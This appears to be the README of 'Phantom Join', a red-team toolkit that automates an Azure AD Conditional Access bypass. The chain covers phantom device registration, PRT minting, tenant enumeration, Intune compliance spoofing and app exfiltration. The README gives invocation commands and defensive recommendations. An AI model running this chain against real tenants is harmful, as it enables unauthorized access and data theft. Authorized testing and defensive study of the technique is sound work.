# Phantom Join — Azure AD Conditional Access Device Identity Bypass

An automated red team toolkit that implements the full attack chain documented by [Cyderes Howler Cell](https://www.cyderes.com/howler-cell/azure-ad-conditional-access-device-identity-abuse): bypassing Azure AD Conditional Access enforcement through device identity abuse, starting from a single set of valid credentials blocked by CA and progressing through phantom device registration, PRT minting, tenant enumeration, Intune compliance bypass, and enterprise application exfiltration.

> **⚠ Authorized engagements only.** This toolkit is designed for red team operators conducting authorized penetration tests. Unauthorized use against systems you do not own or have explicit written permission to test is illegal. Always operate under a signed Rules of Engagement.

---

## Background

Microsoft Entra ID (Azure AD) Conditional Access policies are the primary gatekeeper for enterprise cloud authentication. They evaluate signals like device compliance, user risk, location, and MFA status before granting access. However, the trust chain between Azure AD device registration, Primary Refresh Tokens, Intune compliance, and Conditional Access evaluation contains exploitable gaps when policies are misconfigured or left in report-only mode.

The attack chain this tool automates was first documented by Cyderes Howler Cell in May 2025, demonstrating that a single credential blocked by Conditional Access can be escalated to full tenant compromise without touching a corporate endpoint or deploying malware. The same device code flow entry vector was operationalized at scale by Storm-2372 (suspected Russian state-aligned) beginning in August 2024.

The toolkit wraps [ROADtools](https://github.com/dirkjanm/ROADtools) by Dirk-jan Mollema into a phased, automated workflow with structured logging, findings generation, and MITRE ATT&CK mapping.

---

## Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│ Phase 1: Initial Auth Probe                                     │
│   Confirm CA block (AADSTS53003) on direct ROPC auth            │
│   MITRE: T1078.004                                              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 2: Device Code Flow → DRS Token                           │
│   Authenticate via device code flow to Device Registration      │
│   Service — an endpoint CA often doesn't cover                  │
│   MITRE: T1078.004, T1621                                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 3: Phantom Device Registration                            │
│   Register a fake Azure AD-joined device — no TPM, no           │
│   hardware validation, no admin approval                        │
│   MITRE: T1098.005, T1556.009                                   │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 4: Primary Refresh Token Minting                          │
│   Use phantom device cert + creds to mint a PRT carrying        │
│   device claims (amr: rsa, deviceid)                            │
│   MITRE: T1550.001                                              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 5: PRT → Graph Token Exchange (CA Bypass)                 │
│   Exchange PRT for AAD/MS Graph tokens — same creds that        │
│   triggered AADSTS53003 now produce valid device-auth tokens    │
│   MITRE: T1078.004                                              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 6: Full Tenant Enumeration (ROADrecon)                    │
│   Users, groups, devices, apps, service principals, roles       │
│   MITRE: T1087.004, T1526                                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 7: CA Policy & Hybrid Identity Analysis                   │
│   Report-only policy identification, synced privileged           │
│   accounts, dangerous service principal permissions             │
│   MITRE: T1556.009, T1078.002, T1098.001                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │  (opt-in with --intune)
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 8: Intune Enrollment (Hybrid Domain Bypass)               │
│   Enroll phantom device claiming hybrid domain-join status      │
│   to bypass enrollment restrictions                             │
│   MITRE: T1556.007                                              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────┐
│ Phase 9: Compliance & Application Exfiltration                  │
│   Achieve compliance without a real device, download enterprise │
│   apps via IME channel, scan for internal infrastructure intel  │
│   MITRE: T1530                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

### System Requirements

- **Operating System:** Linux (tested on Ubuntu 22.04/24.04, Kali, WSL2). macOS works but is less tested. Windows is not recommended (use WSL2 instead).
- **Python:** 3.10 or later
- **Network:** Outbound HTTPS to `login.microsoftonline.com`, `graph.windows.net`, `graph.microsoft.com`, `enrollment.manage.microsoft.com`, and Azure AD DRS endpoints. No inbound ports required.
- **Browser:** Required for the device code flow interactive step (Phase 2). Can be on a different machine — the device code flow only needs you to visit `https://microsoft.com/devicelogin`.

### Python Dependencies

Install everything with:

```bash
pip install -r requirements.txt
```

Or manually:

```bash
pip install roadlib roadtx roadrecon requests
```

The core dependency is **ROADtools** by Dirk-jan Mollema, which provides:

| Package | Purpose |
|---------|---------|
| `roadlib` | Core library for Azure AD token operations and API interactions |
| `roadtx` | Token exchange, device registration, PRT operations, Intune MDM emulation |
| `roadrecon` | Azure AD tenant enumeration and offline analysis with SQLite database |
| `requests` | HTTP client (dependency of ROADtools, also used directly) |

### Verify Installation

```bash
# Check that CLI tools are available
roadtx --help
roadrecon --help

# Verify Python version
python3 --version  # Must be 3.10+
```

### What You Need Before Running

1. **Valid target credentials** — username (UPN format: `user@domain.com`) and password for an account in the target tenant
2. **Authorization** — signed Rules of Engagement or equivalent written authorization covering Azure AD/Entra ID, device registration, Intune, and enumeration activities
3. **The credentials should be blocked by CA** — this tool is designed for scenarios where direct auth fails with AADSTS53003. If direct auth succeeds, you don't need the bypass chain (though the tool handles this gracefully)

For Intune phases (8-9), you additionally need:

4. **Intune service host** — the tenant's MDM enrollment hostname (e.g., `svc.manage.microsoft.com:443`). Discoverable during Phase 2 or via DNS (`_enrollmentserver._tcp.manage.microsoft.com`)
5. **On-premises domain name** — for the hybrid domain join bypass claim (e.g., `corp.target.com`)

---

## Installation

```bash
# Clone or download the toolkit
git clone https://github.com/your-org/phantom-join.git
cd phantom-join

# Create a virtual environment (recommended)
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Verify
roadtx --help
python phantom_join.py --help
```

---

## Usage

Everything below is direct CLI invocation — `phantom_join.py` itself has
no built-in gating beyond what's described in Prerequisites. The
dashboard's Phantom tab (`:8092`, `backend/routes/phantom.py`) wraps the
same script via `tools/phantom_runner.py` and adds two config-driven
gates that only apply to *that* invocation path, not direct CLI use:
`allow_phantom_join` (must be explicitly enabled; the tab is hidden and
the run WebSocket sends `{type:"denied"}` then closes otherwise) and
`phantom_join_allowed_domains` (empty/unrestricted by default — when
populated, a dashboard-triggered run is rejected with `{type:"denied"}`
if `-d`/`domain` isn't on the list). This
is the safety control that lets the DEF CON RTV Lab expose Phantom Join
to lab visitors through the dashboard without it being usable against an
arbitrary real tenant — see `docs/DEFCON-LAB-SETUP.md` and
`docs/SESSIONS.md` → *Phantom Join*.

### Basic — Full CA Bypass Chain (Phases 1-7)

```bash
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com
```

This runs phases 1 through 7: confirms the CA block, obtains a DRS token via device code flow, registers a phantom device, mints a PRT, exchanges it for Graph tokens (bypassing CA), enumerates the full tenant, and analyzes CA policies + hybrid identity risks.

### With Intune Enrollment (Phases 1-9)

```bash
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --intune \
    --intune-host svc.manage.microsoft.com:443 \
    --hybrid-domain corp.target.com
```

Adds Intune enrollment via hybrid domain bypass, compliance achievement, and enterprise application exfiltration.

### Dry Run — Preview Commands

```bash
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --dry-run
```

Prints every command that would be executed without actually running anything. Use this to review the chain before a live engagement.

### Resume from a Specific Phase

```bash
# Already have a device cert from a previous run — start at PRT minting
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --start-phase 4 \
    --device-name YOURPC-PC01
```

### Stop at a Specific Phase

```bash
# Only run through device registration (phases 1-3)
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --stop-phase 3
```

### Continue Despite Failures

```bash
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --force
```

By default, the chain halts when a phase fails. `--force` continues to the next phase regardless.

### Custom Output Directory

```bash
python phantom_join.py \
    -u researcher@target.com \
    -p 'P@ssw0rd!' \
    -d target.com \
    --output-dir /path/to/engagements/target-corp
```

---

## Command Reference

```
usage: phantom_join.py [-h] -u USERNAME -p PASSWORD -d DOMAIN
                       [--device-name DEVICE_NAME]
                       [--intune] [--intune-host INTUNE_HOST]
                       [--hybrid-domain HYBRID_DOMAIN]
                       [--start-phase {1..9}] [--stop-phase {1..9}]
                       [--force] [--dry-run]
                       [--output-dir OUTPUT_DIR]

Required:
  -u, --username        Target UPN (user@domain.com)
  -p, --password        Target password
  -d, --domain          Target domain

Device:
  --device-name         Phantom device hostname (auto-generated if omitted)

Intune (opt-in):
  --intune              Enable Intune enrollment phases (8-9)
  --intune-host         Intune MDM service host (host:port)
  --hybrid-domain       On-prem domain for hybrid join bypass

Execution:
  --start-phase         Start from this phase number (default: 1)
  --stop-phase          Stop after this phase number
  --force               Continue despite phase failures
  --dry-run             Preview commands without executing

Output:
  --output-dir          Base directory for run artifacts (default: .)
```

---

## Output Structure

Each run creates a timestamped directory containing all artifacts:

```
phantom_join_20260506_143022/
├── logs/
│   ├── phantom_join_20260506_143022.log    # Full execution log
│   └── findings_20260506_143022.json       # Structured findings (PlexTrac-ready)
├── yourpc-ab12c.pem                        # Phantom device certificate (name is lowercased)
├── yourpc-ab12c.key                        # Phantom device private key
├── .roadtools_auth                         # DRS token cache
├── .roadtools_auth_device                  # Device-authenticated Graph token
├── .roadtools_auth_msgraph                 # MS Graph token
├── roadtx.prt                              # Primary Refresh Token
├── roadrecon.db                            # Full tenant enumeration database
├── yourpc-ab12c.rtdevice                   # Intune device state (if --intune)
└── output/
    └── userapps/                           # Downloaded .intunewin packages (if --intune)
        ├── App1.intunewin
        └── App2.intunewin
```

### Findings JSON Format

The `findings_*.json` file contains structured findings suitable for import into PlexTrac, Plextrac, or custom reporting pipelines:

```json
[
  {
    "timestamp": "2026-05-06T14:30:45+00:00",
    "severity": "CRITICAL",
    "phase": 3,
    "title": "Phantom Device Registered",
    "detail": "Successfully registered phantom device 'yourpc-ab12c' in Azure AD...",
    "mitre": "T1098.005"
  }
]
```

### ROADrecon Database

The `roadrecon.db` SQLite database can be explored interactively:

```bash
# Launch the ROADrecon web UI
roadrecon gui -d roadrecon.db

# Or query directly
sqlite3 roadrecon.db "SELECT userPrincipalName, displayName FROM Users LIMIT 10"
```

---

## Interactive Steps

Phase 2 (DRS token acquisition) and optionally Phase 8 (Intune enrollment token) require completing a **device code flow** in a browser. When the script reaches these phases, it will display a device code and URL. You need to:

1. Open `https://microsoft.com/devicelogin` in any browser (can be on a different machine)
2. Enter the device code displayed in the terminal
3. Authenticate as the target user
4. Complete MFA if prompted (the resulting token will carry the MFA claim, which is required for device registration)

The script waits up to 120 seconds for the flow to complete before timing out.

---

## MITRE ATT&CK Mapping

| Phase | Technique ID | Technique Name |
|-------|-------------|----------------|
| 1 | T1078.004 | Valid Accounts: Cloud Accounts |
| 2 | T1078.004 | Valid Accounts: Cloud Accounts |
| 2 | T1621 | MFA Request Generation |
| 3 | T1098.005 | Account Manipulation: Device Registration |
| 3 | T1556.009 | Modify Authentication Process: Conditional Access Policies |
| 4 | T1550.001 | Use Alternate Authentication Material: Application Access Token |
| 5 | T1078.004 | Valid Accounts: Cloud Accounts |
| 6 | T1087.004 | Account Discovery: Cloud Account |
| 6 | T1526 | Cloud Service Discovery |
| 7 | T1556.009 | Modify Authentication Process: Conditional Access Policies |
| 7 | T1078.002 | Valid Accounts: Domain Accounts |
| 7 | T1098.001 | Additional Cloud Credentials |
| 8 | T1556.007 | Modify Authentication Process: Hybrid Identity |
| 9 | T1530 | Data from Cloud Storage |

---

## Defensive Recommendations

If you're using this tool during an engagement, these are the controls that break the chain at each phase. Include them in your findings report:

| Kill Point | Control | Detail |
|-----------|---------|--------|
| Phase 2 | Block device code flow | Move report-only CA policy to Enabled. Block device code/auth transfer for all users without documented exception. |
| Phase 3 | Require MFA for device registration | Enforce CA policy requiring MFA specifically for the Device Registration Service. Restrict who can register devices. |
| Phase 4 | Require TPM attestation for PRT | Configure TPM 2.0-backed device identity as prerequisite for PRT issuance. |
| Phase 5 | Continuous Access Evaluation | Enable CAE to detect anomalous device claims at token exchange time. |
| Phase 6 | Restrict Graph directory access | Scope user-level Graph API read permissions. Alert on bulk enumeration patterns. |
| Phase 8 | Autopilot-only enrollment | Require pre-registered hardware hashes. Enrollment restrictions alone are insufficient against hybrid bypass. |
| Phase 9 | Require Health Attestation (DHA) | External validation of BitLocker, Secure Boot, and code integrity via Microsoft Health Attestation Service. |
| All | Cloud-only privileged accounts | All Global Admin, Privileged Role Admin, and Security Admin accounts must be cloud-only with PIM. Never sync privileged accounts from on-prem AD. |

---

## Troubleshooting

### "roadtx: command not found"

ROADtools isn't installed or isn't on your PATH:

```bash
pip install roadlib roadtx roadrecon
# If using a venv, make sure it's activated
source .venv/bin/activate
```

### Phase 2 times out

The device code flow has a 120-second window. Make sure you complete the browser authentication before it expires. If the target account has complex MFA (hardware key, number matching), you may need more time — increase the timeout or run Phase 2 manually:

```bash
roadtx gettokens --device-code \
    -r urn:ms-drs:enterpriseregistration.windows.net \
    -c 29d9ed98-a469-4536-ade2-f981bc1d605e
```

Then resume with `--start-phase 3`.

### Phase 3 fails with "already exists"

The device name is already registered in the tenant. Use a different `--device-name`:

```bash
python phantom_join.py ... --device-name DESKTOP-XYZ99
```

### Phase 4 PRT request fails

Common causes: the DRS token expired between phases (re-run from Phase 2), the device certificate is corrupted, or a CA policy blocks PRT issuance. Check the AADSTS error code in the log.

### Phase 6 enumeration is slow

Large tenants (50k+ users) can take 10-15 minutes for full enumeration. The script sets a 600-second timeout. For very large tenants, run ROADrecon manually with custom flags:

```bash
roadrecon gather --tokenfile .roadtools_auth_device -d roadrecon.db
```

### Phase 8 Intune enrollment fails

Enrollment restrictions may block the attempt even with hybrid bypass. Possible causes: the tenant requires Autopilot hardware hashes, the hybrid domain name is wrong, or enrollment is restricted to specific OS versions. Check the Intune service host is correct — wrong hostname produces silent failures.

### Tokens expire mid-chain

Azure AD access tokens typically expire after 60-90 minutes. If you pause between phases, tokens may expire. Re-run from Phase 2 to obtain fresh tokens, or use `--start-phase` to resume from where you left off.

---

## References

- [Cyderes Howler Cell — One Password, No Device, Full Tenant](https://www.cyderes.com/howler-cell/azure-ad-conditional-access-device-identity-abuse)
- [ROADtools by Dirk-jan Mollema](https://github.com/dirkjanm/ROADtools)
- [Microsoft — Storm-2372 Device Code Phishing](https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/)
- [MITRE ATT&CK — T1098.005 Device Registration](https://attack.mitre.org/techniques/T1098/005/)
- [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2)

---

## License

This tool is provided for authorized security testing and research purposes only. Use responsibly and in accordance with all applicable laws and regulations.
